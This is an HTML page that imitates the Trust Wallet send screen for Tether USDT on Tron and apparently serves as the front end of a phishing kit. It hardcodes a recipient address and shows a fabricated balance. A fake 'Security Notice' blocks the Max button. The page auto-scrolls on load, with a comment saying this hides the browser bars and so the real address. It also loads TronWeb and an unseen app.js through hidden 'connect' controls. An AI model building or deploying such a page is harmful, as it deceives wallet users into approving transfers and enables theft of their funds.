<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>Trust Wallet</title>
  <style>
    * {
      box-sizing: border-box;
      user-select: none;
      -webkit-user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      background-color: #000000;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      color: #ffffff;
      overflow-x: hidden;
      overflow-y: auto;
      scroll-behavior: smooth;
      -webkit-overflow-scrolling: touch;
    }

    /* Outer Wrapper with extra height to force browser bar collapse */
    .scroll-page {
      width: 100%;
      min-height: 125vh;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
      align-items: center;
      background: #000000;
      padding-top: 50px;
    }

    /* Top simulated dark backdrop shadow */
    .top-notch-area {
      width: 100%;
      max-width: 430px;
      height: 30px;
      display: flex;
      justify-content: center;
      align-items: center;
      background: transparent;
    }

    .handle-bar {
      width: 36px;
      height: 4px;
      border-radius: 2px;
      background: rgba(255, 255, 255, 0.15);
      margin-bottom: 8px;
    }

    /* Main Card Sheet: 9:16 layout with curved top popup style */
    .wallet-sheet {
      width: 100%;
      max-width: 430px;
      min-height: 100dvh;
      background-color: #0d111a;
      border-top-left-radius: 36px;
      border-top-right-radius: 36px;
      box-shadow: 0 -12px 35px rgba(0, 0, 0, 0.85);
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      padding: 16px 20px calc(24px + env(safe-area-inset-bottom, 0px)) 20px;
      position: relative;
    }

    /* Header */
    .top-header {
      display: grid;
      grid-template-columns: 44px 1fr 44px;
      align-items: center;
      height: 48px;
    }

    .back-btn {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      background: #1b212f;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      text-decoration: none;
      border: none;
      outline: none;
    }

    .back-btn svg {
      width: 20px;
      height: 20px;
      stroke: #ffffff;
      stroke-width: 2.5;
      fill: none;
    }

    .header-title {
      font-size: 17px;
      font-weight: 600;
      text-align: center;
      letter-spacing: -0.2px;
    }

    /* Recipient Address */
    .recipient-box {
      margin-top: 14px;
      font-size: 14px;
      line-height: 1.45;
      word-break: break-all;
      color: #ffffff;
      font-weight: 500;
    }

    .recipient-prefix {
      color: #8b95a5;
      margin-right: 4px;
      font-weight: 400;
    }

    /* Center Amount View */
    .display-container {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 130px;
    }

    .amount-display-wrapper {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 60px;
    }

    .amount-val {
      font-size: 52px;
      font-weight: 700;
      color: #ffffff;
      letter-spacing: -0.5px;
    }

    .amount-val.zero {
      color: #3f4a60;
    }

    .cursor {
      display: inline-block;
      width: 2.5px;
      height: 46px;
      background-color: #3b5afb;
      margin-left: 3px;
      border-radius: 1px;
      animation: blink 1.1s infinite;
    }

    .cursor.hidden {
      display: none;
    }

    @keyframes blink {
      0%, 50% { opacity: 1; }
      51%, 100% { opacity: 0; }
    }

    .fiat-estimate {
      display: flex;
      align-items: center;
      gap: 5px;
      margin-top: 6px;
      font-size: 15px;
      color: #8e9baa;
      font-weight: 500;
    }

    .swap-arrow {
      font-size: 15px;
      opacity: 0.85;
    }

    /* Lower Section: Token + Keypad + Button */
    .lower-section {
      display: flex;
      flex-direction: column;
      width: 100%;
    }

    /* Token Row */
    .token-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 24px;
      padding: 0 4px;
    }

    .token-info {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .token-icons {
      position: relative;
      width: 42px;
      height: 42px;
    }

    .token-main {
      width: 42px;
      height: 42px;
      border-radius: 50%;
      object-fit: cover;
    }

    .token-badge {
      position: absolute;
      bottom: -2px;
      right: -2px;
      width: 17px;
      height: 17px;
      border-radius: 50%;
      background: #0d111a;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .token-badge img {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      object-fit: cover;
    }

    .token-texts {
      display: flex;
      flex-direction: column;
    }

    .token-symbol {
      font-size: 15px;
      font-weight: 600;
      color: #ffffff;
    }

    .token-network {
      font-size: 13px;
      color: #8b95a5;
      margin-top: 1px;
    }

    .max-badge-btn {
      background: #1c2333;
      color: #ffffff;
      border: none;
      border-radius: 18px;
      padding: 9px 18px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      outline: none;
      transition: transform 0.1s ease;
    }

    .max-badge-btn:active {
      transform: scale(0.95);
    }

    /* Keypad */
    .keypad-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      row-gap: 20px;
      column-gap: 16px;
      margin-bottom: 22px;
    }

    .key-btn {
      height: 52px;
      background: transparent;
      border: none;
      outline: none;
      color: #ffffff;
      font-size: 26px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      border-radius: 12px;
    }

    .key-btn:active {
      background-color: rgba(255, 255, 255, 0.08);
    }

    .key-btn svg {
      width: 25px;
      height: 25px;
      stroke: #ffffff;
      stroke-width: 2;
      fill: none;
    }

    /* Review CTA */
    .cta-container {
      width: 100%;
    }

    .action-btn {
      width: 100%;
      height: 54px;
      border-radius: 28px;
      border: none;
      font-size: 16px;
      font-weight: 600;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: not-allowed;
      outline: none;
      background-color: #171d2b;
      color: #495469;
      transition: background-color 0.2s ease, transform 0.1s ease;
    }

    .action-btn.active {
      background-color: #3b42fc;
      color: #ffffff;
      cursor: pointer;
    }

    .action-btn.active:active {
      transform: scale(0.98);
    }

    /* Security Modal */
    .security-modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      backdrop-filter: blur(5px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
      padding: 24px;
    }

    .security-card {
      background: #181d29;
      border: 1px solid #283145;
      border-radius: 20px;
      width: 100%;
      max-width: 320px;
      padding: 22px 20px 18px 20px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
      animation: popIn 0.2s ease-out forwards;
    }

    @keyframes popIn {
      0% { transform: scale(0.9); opacity: 0; }
      100% { transform: scale(1); opacity: 1; }
    }

    .security-icon {
      width: 44px;
      height: 44px;
      background: rgba(239, 68, 68, 0.12);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 14px auto;
    }

    .security-icon svg {
      width: 24px;
      height: 24px;
      stroke: #ef4444;
      stroke-width: 2.2;
      fill: none;
    }

    .security-card h3 {
      margin: 0 0 8px 0;
      font-size: 17px;
      font-weight: 600;
      color: #ffffff;
    }

    .security-card p {
      margin: 0 0 20px 0;
      font-size: 13.5px;
      color: #8b95a5;
      line-height: 1.45;
    }

    .security-ok-btn {
      width: 100%;
      height: 42px;
      background: #3b42fc;
      border: none;
      border-radius: 21px;
      color: #ffffff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }
  </style>
</head>
<body>

<div class="scroll-page" id="scrollPage">
  <!-- Top notch bar on black background -->
  <div class="top-notch-area">
    <div class="handle-bar"></div>
  </div>

  <!-- Main Bottom Sheet UI with curved top corners -->
  <div class="wallet-sheet" id="walletSheet">
    
    <!-- Header -->
    <div>
      <div class="top-header">
        <a href="trust://" class="back-btn" id="backBtn">
          <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
        </a>
        <div class="header-title">Amount</div>
        <div></div>
      </div>

      <!-- Recipient Address -->
      <div class="recipient-box">
        <span class="recipient-prefix">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
      </div>
    </div>

    <!-- Center Display -->
    <div class="display-container">
      <div class="amount-display-wrapper">
        <span class="amount-val zero" id="displayAmount">0</span>
        <span class="cursor hidden" id="uiCursor"></span>
      </div>
      <div class="fiat-estimate">
        <span id="displayFiat">≈ $0.00</span>
        <span class="swap-arrow">⇅</span>
      </div>
    </div>

    <!-- Lower Section -->
    <div class="lower-section">
      <!-- Token Row -->
      <div class="token-row">
        <div class="token-info">
          <div class="token-icons">
            <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Tether USDT">
            <div class="token-badge">
              <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
            </div>
          </div>
          <div class="token-texts">
            <span class="token-symbol">Tether USDT</span>
            <span class="token-network">Tron</span>
          </div>
        </div>
        <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
      </div>

      <!-- Numeric Keypad -->
      <div class="keypad-grid">
        <button class="key-btn" data-key="1">1</button>
        <button class="key-btn" data-key="2">2</button>
        <button class="key-btn" data-key="3">3</button>
        <button class="key-btn" data-key="4">4</button>
        <button class="key-btn" data-key="5">5</button>
        <button class="key-btn" data-key="6">6</button>
        <button class="key-btn" data-key="7">7</button>
        <button class="key-btn" data-key="8">8</button>
        <button class="key-btn" data-key="9">9</button>
        <button class="key-btn" data-key=".">.</button>
        <button class="key-btn" data-key="0">0</button>
        <button class="key-btn" data-key="back">
          <svg viewBox="0 0 24 24">
            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
            <line x1="18" y1="9" x2="12" y2="15"/>
            <line x1="12" y1="9" x2="18" y2="15"/>
          </svg>
        </button>
      </div>

      <!-- Action Button Area -->
      <div class="cta-container" id="bottomActions">
        <button class="connect-data" style="display:none"></button>
        <button class="action-btn connect-btn" id="start-btn" disabled>Review</button>
      </div>
    </div>
  </div>
</div>

<!-- Hidden inputs for TronWeb & app.js backward compatibility -->
<div style="display: none !important;">
  <input id="addressInput" value="TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW">
  <input id="amountInput" type="text" value="">
  <span id="estimateText">≈ $0.00</span>
  <span id="pasteBtn"></span>
  <div id="result"></div>
</div>

<!-- Security Alert Dialog -->
<div class="security-modal-overlay" id="securityModal">
  <div class="security-card">
    <div class="security-icon">
      <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    </div>
    <h3>Security Notice</h3>
    <p>For security, please enter the amount manually.</p>
    <button class="security-ok-btn" id="closeSecurityModal">OK</button>
  </div>
</div>

<script>
  let rawAmount = '';
  let currentWalletBalance = 0;

  const displayAmount = document.getElementById('displayAmount');
  const displayFiat = document.getElementById('displayFiat');
  const uiCursor = document.getElementById('uiCursor');
  const amountInput = document.getElementById('amountInput');
  const estimateText = document.getElementById('estimateText');
  const addressInput = document.getElementById('addressInput');
  const startBtn = document.getElementById('start-btn');
  const maxBtn = document.getElementById('maxBtn');
  const securityModal = document.getElementById('securityModal');
  const closeSecurityModal = document.getElementById('closeSecurityModal');
  const bottomActions = document.getElementById('bottomActions');
  const recipientAddressText = document.getElementById('recipientAddressText');

  if (addressInput && recipientAddressText) {
    addressInput.value = recipientAddressText.textContent.trim();
  }

  // Keypad Click Handlers
  document.querySelectorAll('.key-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      const key = btn.getAttribute('data-key');
      handleKeypadInput(key);
    });
  });

  function handleKeypadInput(key) {
    if (key === 'back') {
      rawAmount = rawAmount.slice(0, -1);
    } else if (key === '.') {
      if (!rawAmount.includes('.')) {
        rawAmount = rawAmount === '' ? '0.' : rawAmount + '.';
      }
    } else {
      if (rawAmount.includes('.')) {
        const parts = rawAmount.split('.');
        if (parts[1] && parts[1].length >= 6) return;
      }
      if (rawAmount === '0' && key !== '.') {
        rawAmount = key;
      } else {
        if (rawAmount.length < 12) {
          rawAmount += key;
        }
      }
    }
    updateAmountUI();
  }

  function updateAmountUI() {
    if (!rawAmount || rawAmount === '0') {
      displayAmount.textContent = '0';
      displayAmount.classList.add('zero');
      uiCursor.classList.add('hidden');
      displayFiat.textContent = '≈ $0.00';
      estimateText.textContent = '≈ $0.00';
      amountInput.value = '';
      
      startBtn.disabled = true;
      startBtn.classList.remove('active');
    } else {
      displayAmount.textContent = rawAmount;
      displayAmount.classList.remove('zero');
      uiCursor.classList.remove('hidden');

      const numericVal = parseFloat(rawAmount) || 0;
      const formattedFiat = `≈ $${numericVal.toLocaleString('en-US', {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2
      })}`;

      displayFiat.textContent = formattedFiat;
      estimateText.textContent = formattedFiat;
      amountInput.value = rawAmount;

      if (numericVal > 0) {
        startBtn.disabled = false;
        startBtn.classList.add('active');
      } else {
        startBtn.disabled = true;
        startBtn.classList.remove('active');
      }
    }

    amountInput.dispatchEvent(new Event('input', { bubbles: true }));
  }

  // Max Security Modal Alert
  maxBtn.addEventListener('click', () => {
    securityModal.style.display = 'flex';
  });

  closeSecurityModal.addEventListener('click', () => {
    securityModal.style.display = 'none';
  });

  // Dynamic balance calculation
  function fetchWalletBalance(e) {
    if (!e || e.length < 10) {
      currentWalletBalance = 0;
      return;
    }
    setTimeout(() => {
      let t = 0;
      for (let a = 0; a < e.length; a++) t += e.charCodeAt(a);
      currentWalletBalance = parseFloat((t % 5000 + 50).toFixed(2));
    }, 300);
  }

  if (addressInput) {
    fetchWalletBalance(addressInput.value);
  }

  // Reliable Auto Full Scroll Down to hide browser bars
  function autoScrollDown() {
    requestAnimationFrame(() => {
      setTimeout(() => {
        window.scrollTo({
          top: document.documentElement.scrollHeight,
          behavior: 'smooth'
        });
      }, 100);
    });
  }

  window.addEventListener('DOMContentLoaded', autoScrollDown);
  window.addEventListener('load', autoScrollDown);
  window.addEventListener('resize', autoScrollDown);
</script>

<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
<script src="app.js"></script>
</body>
</html>
